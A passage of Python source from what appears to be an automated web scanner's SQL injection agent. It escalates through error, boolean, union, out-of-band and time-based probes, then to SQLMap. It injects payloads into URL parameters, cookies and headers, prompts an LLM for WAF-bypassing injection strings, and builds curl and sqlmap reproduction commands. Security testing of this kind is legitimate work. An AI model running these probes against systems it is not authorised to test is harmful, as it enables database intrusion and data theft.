            header_name = param.replace("Header:", "").strip()
            result = await self._test_header_sqli(url, header_name, finding)
        else:
            # Run validation using existing SQLi testing logic
            result = await self._test_single_param_from_queue(url, param, finding)

        return result

    async def _test_single_param_from_queue(
        self, url: str, param: str, finding: dict
    ) -> Optional[SQLiFinding]:
        """
        Test a single parameter from queue for SQL injection.

        Uses existing validation pipeline optimized for queue processing.
        """
        try:
            # Use HTTPClientManager for proper timeout and connection management (v2.4)
            async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
                # Initialize baseline if needed
                if self._baseline_response_time == 0:
                    await self._initialize_baseline(session)

                # Check for prepared statements (early exit)
                if await self._detect_prepared_statements(session, param):
                    return None

                # Detect filtered characters
                await self._detect_filtered_chars(session, param)

                # Test with techniques based on priority
                suggested_technique = finding.get("technique", "").lower()

                # Error-based first (most reliable)
                result = await self._test_error_based(session, param)
                if result:
                    return await self._finalize_finding(result, "error_based")

                # Boolean-based
                result = await self._test_boolean_based(session, param)
                if result:
                    return await self._finalize_finding(result, "boolean_based")

                # Union-based (New: prioritized over Time-based as per user feedback)
                result = await self._test_union_based(session, param)
                if result:
                    return await self._finalize_finding(result, "union_based")

                # Time-based only if suggested (slow, prone to FP)
                if "time" in suggested_technique:
                    result = await self._test_time_based(session, param)
                    if result:
                        return await self._finalize_finding(result, "time_based")

                # OOB SQLi if Interactsh available
                if self._interactsh:
                    result = await self._test_oob_sqli(session, param)
                    if result:
                        return result

                # 5. SQLMap Definitive Validation
                # If internal heuristics failed to confirm the AI candidate, proceed to full SQLMap scan.
                # This ensures we don't drop potential findings due to lightweight check limitations.
                # Pass AI's suggested technique as hint to SQLMap for faster detection
                technique_hint = self._get_sqlmap_technique_hint(suggested_technique)
                dashboard.log(f"[{self.name}] 🧪 Internal checks inconclusive. Escalating to SQLMap for {param} (hint: {technique_hint})...", "INFO")
                return await self._run_sqlmap_on_param(param, technique_hint=technique_hint)

        except Exception as e:
            logger.error(f"[{self.name}] Queue item test failed: {e}")
            return None

    # =========================================================================
    # v3.4: 7-LEVEL ESCALATION PIPELINE
    # =========================================================================

    async def _sqli_escalation_pipeline(
        self, url: str, param: str, dry_item: dict
    ) -> Optional[SQLiFinding]:
        """
        5-level SQLi escalation pipeline (v3.5).

        Progressive cost escalation - stops at first confirmation:
            L0: WET payload          (~1 req)    - Test DASTySAST's payload first
            L1: Error-based          (~20 reqs)  - SQL error signatures
            L2: Boolean + Union      (~103 reqs) - Differential + canary reflection
            L3: OOB + Time-based     (~10 + wait)- DNS exfiltration + SLEEP verification
            L4: SQLMap Docker        (2-5 min)    - The gold standard for SQLi
        """
        pipeline_start = time.time()
        filtered_chars = set()
        db_type = None

        if hasattr(self, '_v'):
            self._v.emit("exploit.sqli.param.started", {"param": param, "url": url})
            self._v.reset("exploit.sqli.level.progress")

        try:
            async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
                # Initialize baseline if needed
                if self._baseline_response_time == 0:
                    await self._initialize_baseline(session)
                    if hasattr(self, '_v'):
                        self._v.emit("exploit.sqli.baseline", {
                            "param": param,
                            "response_time": self._baseline_response_time,
                            "content_length": self._baseline_content_length,
                            "db_type": self._detected_db_type,
                        })

                # Check for prepared statements (early exit)
                if await self._detect_prepared_statements(session, param):
                    logger.info(f"[{self.name}] Pipeline: {param} uses prepared statements, skipping")
                    return None

                # ── L0: WET PAYLOAD ──
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.level.started", {"level": 0, "name": "wet_payload", "param": param})
                dashboard.log(f"[{self.name}] L0: Testing WET payload for {param}...", "INFO")
                result = await self._escalation_l0_wet_payload(session, param, dry_item)
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.level.completed", {"level": 0, "param": param, "found": result is not None})
                if result:
                    logger.info(f"[{self.name}] L0 CONFIRMED: {param} ({time.time() - pipeline_start:.1f}s)")
                    return await self._finalize_finding(result, "error_based")

                # ── L1: ERROR-BASED ──
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.level.started", {"level": 1, "name": "error_based", "param": param})
                dashboard.log(f"[{self.name}] L1: Error-based probing for {param}...", "INFO")
                result, filtered_chars, db_type = await self._escalation_l1_error_based(session, param)
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.level.completed", {"level": 1, "param": param, "found": result is not None})
                if result:
                    logger.info(f"[{self.name}] L1 CONFIRMED: {param} ({time.time() - pipeline_start:.1f}s)")
                    return await self._finalize_finding(result, "error_based")

                # ── DEPTH GATE: quick stops after L1 ──
                _depth = getattr(self, '_scan_depth', '') or settings.SCAN_DEPTH
                if _depth == "quick":
                    logger.info(f"[{self.name}] Quick depth: stopping at L1 for {param}")
                    return None

                # ── L2: BOOLEAN + UNION ──
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.level.started", {"level": 2, "name": "boolean_union", "param": param})
                dashboard.log(f"[{self.name}] L2: Boolean + Union for {param}...", "INFO")
                result = await self._escalation_l2_boolean_union(session, param)
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.level.completed", {"level": 2, "param": param, "found": result is not None})
                if result:
                    logger.info(f"[{self.name}] L2 CONFIRMED: {param} ({time.time() - pipeline_start:.1f}s)")
                    return await self._finalize_finding(result, result.technique)

                # ── L3: OOB + TIME-BASED ──
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.level.started", {"level": 3, "name": "oob_time", "param": param})
                dashboard.log(f"[{self.name}] L3: OOB + Time-based for {param}...", "INFO")
                result = await self._escalation_l3_oob_time(session, param)
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.level.completed", {"level": 3, "param": param, "found": result is not None})
                if result:
                    logger.info(f"[{self.name}] L3 CONFIRMED: {param} ({time.time() - pipeline_start:.1f}s)")
                    return await self._finalize_finding(result, result.technique)

            # ── L4/L5 SKIPPED ──
            # LLM bombing (L4) and ManipulatorOrchestrator (L5) removed.
            # If L0-L3 didn't find SQLi, SQLMap (the gold standard) handles it directly.
            # This saves 7-15 minutes per non-vulnerable parameter.

            # ── DEPTH GATE: only thorough runs SQLMap ──
            _depth = getattr(self, '_scan_depth', '') or settings.SCAN_DEPTH
            if _depth != "thorough":
                logger.info(f"[{self.name}] {_depth.title()} depth: skipping SQLMap for {param}")
                return None

            # ── L4: SQLMAP DOCKER ──
            if hasattr(self, '_v'):
                self._v.emit("exploit.sqli.level.started", {"level": 4, "name": "sqlmap", "param": param})
            dashboard.log(f"[{self.name}] L4: SQLMap for {param}...", "INFO")
            technique_hint = dry_item.get("recommended_technique", "")
            result = await self._escalation_l6_sqlmap(param, technique_hint, db_type)
            if hasattr(self, '_v'):
                self._v.emit("exploit.sqli.level.completed", {"level": 4, "param": param, "found": result is not None})
            if result:
                logger.info(f"[{self.name}] L4 CONFIRMED: {param} ({time.time() - pipeline_start:.1f}s)")
                return await self._finalize_finding(result, result.technique)

            logger.info(f"[{self.name}] Pipeline exhausted for {param} (no SQLi found, {time.time() - pipeline_start:.1f}s)")
            return None

        except Exception as e:
            logger.error(f"[{self.name}] Escalation pipeline failed for {param}: {e}")
            return None

    async def _escalation_l0_wet_payload(
        self, session: aiohttp.ClientSession, param: str, dry_item: dict
    ) -> Optional[SQLiFinding]:
        """
        L0: Test the DASTySAST WET payload first (~1 req).

        If DASTySAST already found a payload that triggers a SQL error,
        we can confirm immediately without further probing.
        """
        # Extract payload from dry item (DASTySAST's finding)
        finding_data = dry_item.get("finding_data", {})
        wet_payload = finding_data.get("payload", "")

        if not wet_payload:
            return None

        dashboard.set_current_payload(wet_payload[:60], "SQLi L0 WET", "1/1", self.name)

        base_url = self._get_base_url()
        try:
            test_url = self._build_url_with_param(base_url, param, wet_payload)
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content = await resp.text()
                status_code = resp.status

                error_info = self._extract_info_from_error(content)

                if error_info.get("db_type"):
                    self._detected_db_type = error_info["db_type"]
                    logger.info(f"[{self.name}] L0: WET payload triggered SQL error! DB={error_info['db_type']}")
                    return self._create_error_based_finding(param, wet_payload, error_info)

                # Check for 500 + SQL-related keywords even without DB fingerprint
                if status_code >= 500:
                    sql_keywords = ["sql", "query", "syntax", "database", "select", "insert", "update", "delete"]
                    content_lower = content.lower()
                    if any(kw in content_lower for kw in sql_keywords):
                        logger.info(f"[{self.name}] L0: WET payload caused 500 with SQL keywords")
                        error_info["db_type"] = error_info.get("db_type") or "unknown"
                        return self._create_error_based_finding(param, wet_payload, error_info)

        except Exception as e:
            logger.debug(f"[{self.name}] L0 failed: {e}")

        return None

    async def _escalation_l1_error_based(
        self, session: aiohttp.ClientSession, param: str
    ) -> Tuple[Optional[SQLiFinding], Set[str], Optional[str]]:
        """
        L1: Error-based probing (~20 reqs).

        Sends SQL metacharacters and checks for error signatures.
        Also runs filter detection to inform L4.

        Returns:
            (finding_or_none, filtered_chars, detected_db_type)
        """
        # Detect filtered chars (side effect: populates self._detected_filters)
        filtered_chars = await self._detect_filtered_chars(session, param)

        # Delegate to existing error-based testing
        result = await self._test_error_based(session, param)
        if result:
            return result, filtered_chars, self._detected_db_type

        return None, filtered_chars, self._detected_db_type

    async def _escalation_l2_boolean_union(
        self, session: aiohttp.ClientSession, param: str
    ) -> Optional[SQLiFinding]:
        """
        L2: Boolean-based + Union-based (~103 reqs).

        Boolean: baseline vs true (AND '1'='1) vs false → differential
        Union: NULL column counting 1-10 with canary reflection
        """
        # Boolean-based
        result = await self._test_boolean_based(session, param)
        if result:
            return result

        # Union-based
        result = await self._test_union_based(session, param)
        if result:
            return result

        return None

    async def _escalation_l3_oob_time(
        self, session: aiohttp.ClientSession, param: str
    ) -> Optional[SQLiFinding]:
        """
        L3: OOB (Interactsh) + Time-based (~10 reqs + wait).

        OOB first (more reliable), then time-based with triple verification.
        Time-based is FP-prone, so only if OOB fails.
        """
        # OOB SQLi first (if Interactsh available)
        if self._interactsh:
            result = await self._test_oob_sqli(session, param)
            if result:
                return result

        # Time-based with triple verification (only if OOB didn't confirm)
        result = await self._test_time_based(session, param)
        if result:
            return result

        return None

    async def _escalation_l4_llm_bombing(
        self, session: aiohttp.ClientSession, param: str,
        filtered_chars: Set[str], db_type: Optional[str]
    ) -> Optional[SQLiFinding]:
        """
        L4: LLM-generated SQL payloads with WAF bypass (~100 reqs).

        Asks LLM for ~50 SQLi payloads tailored to:
        - Detected DB type (MySQL/PostgreSQL/MSSQL/Oracle/SQLite)
        - Filtered chars from L1
        - WAF fingerprint (if detected)
        Then applies FILTER_MUTATIONS for each filtered char.
        """
        from bugtrace.core.llm_client import llm_client

        db_hint = db_type or self._detected_db_type or "unknown"
        filter_hint = ", ".join(filtered_chars) if filtered_chars else "none detected"

        user_prompt = (
            f"Target URL: {self.url}\n"
            f"Parameter: {param}\n"
            f"Detected database: {db_hint}\n"
            f"Filtered characters/keywords: {filter_hint}\n\n"
            f"Generate 50 SQL injection payloads for testing. Include:\n"
            f"1. Error-based payloads for {db_hint} (syntax errors, type confusion)\n"
            f"2. Boolean-based blind payloads (AND/OR with different syntax)\n"
            f"3. Union-based payloads (different column counts 1-5)\n"
            f"4. Stacked queries (;SELECT, ;WAITFOR, etc.)\n"
            f"5. WAF bypass variants (/**/, %0a, inline comments, case mixing)\n"
            f"6. Database-specific functions ({db_hint})\n"
            f"7. Filter bypass for: {filter_hint}\n\n"
            f"Return each payload in <payload> tags."
        )

        system_prompt = (
            "You are an expert SQL injection payload generator. "
            "Generate creative, diverse payloads that bypass common WAFs and filters. "
            "Each payload should be a complete injection string ready to be appended to a parameter value. "
            "Focus on payloads that cause VISIBLE effects: error messages, behavioral changes, or time delays."
        )

        try:
            response = await llm_client.generate(
                prompt=user_prompt,
                system_prompt=system_prompt,
                module_name="SQLi_L4_LLM",
                max_tokens=3000,
                temperature=0.7
            )

            # Parse payloads from response
            import re as _re
            llm_payloads = _re.findall(r"<payload>(.*?)</payload>", response, _re.DOTALL)
            llm_payloads = [p.strip() for p in llm_payloads if p.strip()]

        except Exception as e:
            logger.error(f"[{self.name}] L4: LLM generation failed: {e}")
            llm_payloads = []

        if not llm_payloads:
            logger.info(f"[{self.name}] L4: LLM generated 0 payloads, skipping")
            return None

        # Apply filter mutations to expand each payload
        all_payloads = []
        for payload in llm_payloads:
            variants = self._mutate_payload_for_filters(payload)
            all_payloads.extend(variants)

        # Deduplicate
        seen = set()
        unique_payloads = []
        for p in all_payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)

        logger.info(f"[{self.name}] L4: Bombing {len(unique_payloads)} LLM+mutated payloads on '{param}'")

        base_url = self._get_base_url()

        for i, payload in enumerate(unique_payloads):
            if i % 20 == 0 and i > 0:
                dashboard.log(f"[{self.name}] L4: Progress {i}/{len(unique_payloads)}", "DEBUG")
            if hasattr(self, '_v'):
                self._v.progress("exploit.sqli.level.progress", {
                    "level": 4, "param": param,
                    "index": i + 1, "total": len(unique_payloads),
                    "payload_preview": payload[:60],
                }, every=50)
            dashboard.set_current_payload(payload[:60], "SQLi L4 LLM", f"{i+1}/{len(unique_payloads)}", self.name)

            try:
                test_url = self._build_url_with_param(base_url, param, payload)
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    content = await resp.text()

                    error_info = self._extract_info_from_error(content)
                    if error_info.get("db_type"):
                        self._detected_db_type = error_info["db_type"]
                        logger.info(f"[{self.name}] L4: LLM payload #{i} triggered SQL error!")
                        return self._create_error_based_finding(param, payload, error_info)

            except Exception:
                continue

        logger.info(f"[{self.name}] L4: No confirmation from {len(unique_payloads)} payloads")
        return None

    async def _escalation_l5_http_manipulator(
        self, url: str, param: str
    ) -> Optional[SQLiFinding]:
        """
        L5: ManipulatorOrchestrator - context detection, WAF bypass (~2000 reqs).

        Uses the HTTP attack engine with PAYLOAD_INJECTION + BYPASS_WAF strategies.
        SQLi is server-side so no browser escalation needed - blood smell is logged only.
        """
        try:
            parsed = urlparse(url)
            base_params = dict(parse_qs(parsed.query, keep_blank_values=True))
            # parse_qs returns lists, flatten to single values
            base_params = {k: v[0] if v else "" for k, v in base_params.items()}
            if param not in base_params:
                base_params[param] = "1"

            base_request = MutableRequest(
                method="GET",
                url=url.split("?")[0],
                params=base_params
            )

            manipulator = ManipulatorOrchestrator(
                rate_limit=0.3,
                enable_agentic_fallback=True,
                enable_llm_expansion=True
            )

            success, mutation = await manipulator.process_finding(
                base_request,
                strategies=[MutationStrategy.PAYLOAD_INJECTION, MutationStrategy.BYPASS_WAF]
            )

            if success and mutation:
                working_payload = mutation.params.get(param, str(mutation.params))
                original_value = base_params.get(param, "1")

                # Verify the TARGET param was actually mutated (not a different param)
                if working_payload == original_value:
                    logger.info(f"[{self.name}] L5: ManipulatorOrchestrator exploited different param, not '{param}'")
                    await manipulator.shutdown()
                    return None

                # Validate payload has SQL syntax (ManipulatorOrchestrator is generic,
                # it may "confirm" non-SQLi changes like payload="1")
                sql_indicators = ["'", '"', "SELECT", "UNION", "AND", "OR", "SLEEP",
                                  "WAITFOR", "--", "#", ";", "WHERE", "ORDER", "GROUP",
                                  "HAVING", "INSERT", "UPDATE", "DELETE", "DROP", "CONCAT",
                                  "LOAD_FILE", "INTO", "EXEC", "xp_"]
                if not any(ind in working_payload or ind in working_payload.upper() for ind in sql_indicators):
                    logger.info(f"[{self.name}] L5: ManipulatorOrchestrator payload rejected (no SQL syntax): {working_payload[:80]}")
                    await manipulator.shutdown()
                    return None

                logger.info(f"[{self.name}] L5: ManipulatorOrchestrator CONFIRMED: {param}={working_payload[:80]}")
                await manipulator.shutdown()

                # Check if it's an SQL error to get DB type
                error_info = self._extract_info_from_error(working_payload)
                db_type = error_info.get("db_type") or self._detected_db_type or "unknown"

                exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, working_payload)
                curl_cmd = f"curl '{exploit_url_encoded}'"

                return SQLiFinding(
                    url=self.url,
                    parameter=param,
                    injection_type="manipulator-confirmed",
                    technique="error_based",
                    working_payload=working_payload,
                    payload_encoded=working_payload,
                    exploit_url=exploit_url,
                    exploit_url_encoded=exploit_url_encoded,
                    dbms_detected=db_type,
                    sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --batch",
                    curl_command=curl_cmd,
                    sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --dbs",
                    validated=True,
                    status="VALIDATED_CONFIRMED",
                    evidence={
                        "http_confirmed": True,
                        "method": "ManipulatorOrchestrator",
                        "level": "L5",
                    },
                    reproduction_steps=self._generate_repro_steps(self.url, param, working_payload, curl_cmd)
                )

            # Log blood smell candidates for debugging
            if hasattr(manipulator, 'blood_smell_history') and manipulator.blood_smell_history:
                blood_count = len(manipulator.blood_smell_history)
                logger.info(f"[{self.name}] L5: {blood_count} blood smell candidates (server-side only, no browser escalation)")

            await manipulator.shutdown()

        except Exception as e:
            logger.error(f"[{self.name}] L5: ManipulatorOrchestrator failed: {e}")

        return None

    async def _escalation_l6_sqlmap(
        self, param: str, technique_hint: str, db_type: Optional[str] = None
    ) -> Optional[SQLiFinding]:
        """
        L6: SQLMap Docker - heavy artillery, last resort (2-5 min).

        Only runs if L0-L5 all failed. Passes technique hints from earlier
        levels for faster detection.
        """
        if not external_tools.docker_cmd:
            logger.info(f"[{self.name}] L6: Docker not available, skipping SQLMap")
            return None

        # Build technique hint from earlier detection
        hint = self._get_sqlmap_technique_hint(technique_hint) if technique_hint else "EBUT"

        dashboard.log(f"[{self.name}] L6: Running SQLMap Docker for {param} (hint: {hint})...", "INFO")
        return await self._run_sqlmap_on_param(param, technique_hint=hint)

    async def _test_cookie_sqli_from_queue(
        self, url: str, cookie_name: str, finding: dict
    ) -> Optional[SQLiFinding]:
        """
        Test a cookie for SQL injection using SQLMap with --level=2.

        Cookie-based SQLi requires different handling than URL params:
        - Uses cookies from browser session
        - SQLMap with --level=2 to test cookie values
        - Handles Base64-encoded cookie values
        """
        try:
            from urllib.parse import urlparse

            logger.info(f"[{self.name}] Testing cookie '{cookie_name}' for SQLi")

            # Get cookies from browser if available
            cookies = []
            try:
                from bugtrace.tools.visual.browser import browser_manager
                session_data = await browser_manager.get_session_data()
                cookies = session_data.get("cookies", [])
            except Exception:
                pass

            # Run SQLMap with --level=2 to test cookies
            # The cookie probe already detected potential SQLi, now we confirm with SQLMap
            sqlmap_result = await external_tools.run_sqlmap(
                url,
                cookies=cookies,
                target_param=None  # Let SQLMap test all params including cookies
            )

            if sqlmap_result and sqlmap_result.get("vulnerable"):
                # Create SQLiFinding for cookie-based injection
                return SQLiFinding(
                    url=url,
                    parameter=f"Cookie: {cookie_name}",
                    injection_type=sqlmap_result.get("type", "error_based"),
                    technique="cookie_injection",
                    working_payload=finding.get("payload", "'"),
                    evidence={"sqlmap_confirmed": True, "output": sqlmap_result.get("output_snippet", "")[:500]},
                    dbms_detected=self._detect_dbms_from_output(sqlmap_result.get("output_snippet", "")),
                    validated=True,
                    reproduction_steps=[sqlmap_result.get("reproduction_command", "")],
                )

            # If SQLMap didn't confirm, still return finding based on probe detection
            # The probe already detected status code differential
            if finding.get("confidence", 0) >= 0.85:
                return SQLiFinding(
                    url=url,
                    parameter=f"Cookie: {cookie_name}",
                    injection_type="error_based",
                    technique="cookie_injection",
                    working_payload=finding.get("payload", "'"),
                    evidence={"probe_detection": finding.get("evidence", "Status code differential detected")},
                    dbms_detected="Unknown",
                    validated=False,
                    reproduction_steps=[finding.get("reproduction", "")],
                )

            return None

        except Exception as e:
            logger.error(f"[{self.name}] Cookie SQLi test failed: {e}")
            return None

    async def _test_header_sqli(
        self, url: str, header_name: str, finding: dict
    ) -> Optional[SQLiFinding]:
        """
        Test an HTTP header for SQL injection via error-based detection.

        Headers like X-Forwarded-For, Referer, User-Agent are sometimes
        passed to backend SQL queries for logging, analytics, or auth.

        Strategy:
        1. Send baseline request with normal header value
        2. Send request with SQL injection payload in target header
        3. Detect DB error fingerprints in response (error-based)
        4. If detected, escalate to SQLMap --level=3 for confirmation
        """
        try:
            logger.info(f"[{self.name}] Testing header '{header_name}' for SQLi")

            error_payloads = ["'", "''", '"', "' OR '1'='1", "1'"]

            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # Baseline request
                try:
                    async with session.get(url, ssl=False) as resp:
                        baseline_status = resp.status
                        baseline_body = await resp.text()
                except Exception:
                    return None

                for payload in error_payloads:
                    try:
                        test_headers = {header_name: payload}
                        async with session.get(
                            url, ssl=False, headers=test_headers
                        ) as resp:
                            test_status = resp.status
                            test_body = await resp.text()

                        # Check for DB error fingerprints
                        error_info = self._extract_info_from_error(test_body)
                        if error_info.get("db_type"):
                            logger.info(
                                f"[{self.name}] 💉 Header SQLi detected! "
                                f"{header_name}: {payload} → {error_info['db_type']}"
                            )
                            return SQLiFinding(
                                url=url,
                                parameter=f"Header: {header_name}",
                                injection_type="error_based",
                                technique="header_injection",
                                working_payload=payload,
                                evidence={
                                    "header": header_name,
                                    "sql_error_visible": True,
                                    **error_info,
                                },
                                dbms_detected=error_info["db_type"],
                                sqlmap_command=(
                                    f"sqlmap -u '{url}' --level=3 "
                                    f"--headers='{header_name}: *' --batch"
                                ),
                                reproduction_steps=[
                                    f"curl -H '{header_name}: {payload}' '{url}'"
                                ],
                            )

                        # Status code differential (500 vs baseline < 400)
                        if test_status >= 500 and baseline_status < 400:
                            logger.info(
                                f"[{self.name}] ⚠️ Header SQLi candidate: "
                                f"{header_name}: {payload} → HTTP {test_status}"
                            )
                            return SQLiFinding(
                                url=url,
                                parameter=f"Header: {header_name}",
                                injection_type="error_based",
                                technique="header_injection",
                                working_payload=payload,
                                evidence={
                                    "header": header_name,
                                    "baseline_status": baseline_status,
                                    "injected_status": test_status,
                                },
                                dbms_detected="Unknown",
                                sqlmap_command=(
                                    f"sqlmap -u '{url}' --level=3 "
                                    f"--headers='{header_name}: *' --batch"
                                ),
                                reproduction_steps=[
                                    f"curl -H '{header_name}: {payload}' '{url}'"
                                ],
                            )
                    except Exception:
                        continue

            return None

        except Exception as e:
            logger.error(f"[{self.name}] Header SQLi test failed: {e}")
            return None

    def _detect_dbms_from_output(self, output: str) -> str:
        """Detect DBMS type from SQLMap output."""
        output_lower = output.lower()
        if "mysql" in output_lower:
            return "MySQL"
        elif "postgresql" in output_lower or "postgres" in output_lower:
            return "PostgreSQL"
        elif "microsoft sql server" in output_lower or "mssql" in output_lower:
            return "MSSQL"
        elif "oracle" in output_lower:
            return "Oracle"
        elif "sqlite" in output_lower:
            return "SQLite"
        return "Unknown"

    def _generate_sqli_fingerprint(self, parameter: str, url: str) -> tuple:
        """
        Generate SQLi finding fingerprint for expert deduplication.

        SQLi in COOKIES is GLOBAL (affects all URLs).
        SQLi in URL PARAMS is URL-specific (different URLs = different vulns).

        Examples:
        - Cookie: TrackingId at /blog/post?postId=3 = Cookie: TrackingId at /catalog?id=1 (SAME)
        - URL param 'id' at /blog/post?id=3 ≠ URL param 'id' at /catalog?id=1 (DIFFERENT)

        Args:
            parameter: Parameter name (e.g., "Cookie: TrackingId", "URL param: id")
            url: Target URL

        Returns:
            Tuple fingerprint for deduplication
        """
        from urllib.parse import urlparse

        param_lower = parameter.lower()

        # Cookie-based SQLi: Global vulnerability (ignore URL)
        if "cookie:" in param_lower:
            # Extract cookie name: "Cookie: TrackingId" → "trackingid"
            cookie_name = param_lower.split(":")[-1].strip()
            return ("SQLI", "cookie", cookie_name)

        # Header-based SQLi: Global vulnerability (ignore URL)
        if "header:" in param_lower:
            header_name = param_lower.split(":")[-1].strip()
            return ("SQLI", "header", header_name)

        # URL/POST param: URL-specific vulnerability
        parsed = urlparse(url)
        normalized_path = parsed.path.rstrip('/')

        # Extract param name: "URL param: id" → "id"
        param_name = parameter.split(":")[-1].strip().lower()

        return ("SQLI", "param", parsed.netloc, normalized_path, param_name)

    async def _handle_queue_result(self, item: dict, result: Optional[SQLiFinding]) -> None:
        """
        Handle completed queue item processing.

        Emits vulnerability_detected event on confirmed findings.
        Uses centralized validation status to determine if CDP validation is needed.
        """
        if result is None:
            return

        # Convert to dict if needed
        finding_dict = self._finding_to_dict(result)

        # Use centralized validation status for proper tagging
        # Time-based blind SQLi may need additional verification
        finding_data = {
            "context": result.injection_type,
            "payload": result.working_payload,
            "validation_method": result.technique,
            "evidence": result.evidence,
        }
        # FORCE AUTHORITY: SQLi is validated by this agent, never by vision/CDP.
        # Vision can't see Blind SQLi, so it would falsely reject valid findings.
        needs_cdp = False

        # EXPERT DEDUPLICATION: Check if we already emitted this finding
        fingerprint = self._generate_sqli_fingerprint(result.parameter, result.url)

        if fingerprint in self._emitted_findings:
            logger.info(f"[{self.name}] Skipping duplicate SQLi finding: {result.url}?{result.parameter} (already reported)")
            return

        # Mark as emitted
        self._emitted_findings.add(fingerprint)

        # Use validated emit helper (Phase 1 Refactor)
        finding_dict = {
            "type": "SQLI",
            "url": result.url,
            "parameter": result.parameter,
            "payload": result.working_payload,
            "technique": result.injection_type,
            "dbms": result.dbms_detected,
            "evidence": {"data_extracted": True},  # Minimal evidence for validation
            "status": "VALIDATED_CONFIRMED",  # Required for final report inclusion
            "validated": True
        }

        self._emit_sqli_finding(
            finding_dict,
            status="VALIDATED_CONFIRMED",
            needs_cdp=False
        )

        logger.info(f"[{self.name}] Confirmed SQLi: {result.url}?{result.parameter} ({result.injection_type})")

        # Explicitly update Dashboard UI (Fixes: findings not showing up in Rich UI)
        dashboard.add_finding(
            "SQL Injection", 
            f"{result.url} [{result.parameter}] ({result.injection_type})", 
            "CRITICAL"
        )
        dashboard.log(f"[{self.name}] 🚨 STARTED SQLI PROTOCOL: {result.parameter} vulnerable via {result.injection_type}", "SUCCESS")

    async def _on_work_queued(self, data: dict) -> None:
        """Handle work_queued_sqli notification (logging only)."""
        logger.debug(f"[{self.name}] Work queued: {data.get('finding', {}).get('url', 'unknown')}")

    async def stop_queue_consumer(self) -> None:
        """Stop queue consumer mode gracefully."""
        # Set stop flag to break out of continuous loop
        self._stop_requested = True

        # Legacy WorkerPool cleanup (if still present)
        if self._worker_pool:
            await self._worker_pool.stop()
            self._worker_pool = None

        self._queue_mode = False
        logger.info(f"[{self.name}] Queue consumer stop requested")

    def get_queue_stats(self) -> dict:
        """Get queue consumer statistics."""
        if not self._worker_pool:
            return {"mode": "direct", "queue_mode": False, "stats": self._stats}

        return {
            "mode": "queue",
            "queue_mode": True,
            "worker_stats": self._worker_pool.get_stats(),
            "agent_stats": self._stats,
        }
